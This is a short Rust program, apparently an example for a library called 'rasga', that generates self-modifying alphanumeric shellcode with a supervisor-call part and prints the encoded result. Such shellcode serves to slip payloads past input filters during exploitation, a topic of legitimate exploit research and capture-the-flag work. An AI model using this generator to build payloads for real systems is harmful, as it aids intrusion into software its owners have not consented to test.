use rasga::prelude::*;

fn main() {
    let mut prng = StdRng::seed_from_u64(0);
    let mut state = State::default();
    state.marker = prng.random_range(1..=9);
    state.x = get_random_alphanumeric_offset_char(&mut prng, 0x01);

    let mut svc_part = build_svc_part(&mut prng, &state, 0x80);

    let self_modifying = build_self_modifying_part(
        &mut prng,
        &mut svc_part,
        &mut state,
        0x70776000,
        0x200,
        0x110,
    );

    let mut output = Shellcode::default();
    output.check_alphanumeric = true;

    output.cat(&self_modifying);
    output.cat(&svc_part);

    output.is_alphanumeric().unwrap();

    match String::try_from(&output) {
        Ok(s) => {
            println!("{}", s);
        },
        Err(e) => {
            println!("{}", e);
        }
    }
}
